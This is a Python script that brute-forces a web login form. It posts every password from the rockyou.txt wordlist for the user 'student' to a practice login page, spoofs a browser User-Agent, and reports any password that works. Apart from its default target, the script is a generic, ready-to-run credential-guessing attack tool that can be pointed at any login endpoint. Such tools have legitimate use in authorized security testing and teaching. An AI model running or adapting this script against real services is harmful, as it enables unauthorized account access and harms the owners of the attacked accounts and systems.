import requests
import sys
import time
from requests.exceptions import RequestException

# Configuration
target_url = "https://practicetestautomation.com/practice-test-login/"
username = "student"
passwords_file = "rockyou.txt"
delay = 0.5

def try_login(username, password):
    """Attempt a single login"""
    try:
        session = requests.Session()
        
        # Get login page first to get any required cookies
        session.get(target_url)
        
        # Login form data
        data = {
            "username": username,
            "password": password,
            "submit": "Submit"
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        # Make login attempt
        response = session.post(target_url, data=data, headers=headers)
        
        # Check for successful login indicators
        if "logged-in-successfully" in response.url.lower():
            return True
        return False

    except Exception as e:
        print(f"\nError: {e}")
        return False

def main():
    # First try known good credentials
    print("[+] Testing known credentials...")
    if try_login(username, "Password123"):
        print("[+] Login successful with known credentials!")
        return
    
    try:
        # Read password file and try each password
        with open(passwords_file, "r", encoding="latin-1", errors='ignore') as f:
            print(f"[+] Starting password attempts for user: {username}")
            
            for line in f:
                password = line.strip()
                sys.stdout.write(f"[*] Trying: {password}\r")
                sys.stdout.flush()

                if try_login(username, password):
                    print(f"\n[+] Success! Password found: {password}")
                    return
                
                time.sleep(delay)
            
            print("\n[-] Password not found")

    except FileNotFoundError:
        print(f"\n[-] Password file '{passwords_file}' not found")
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted")
    except Exception as e:
        print(f"\n[-] Error: {e}")

if __name__ == "__main__":
    main()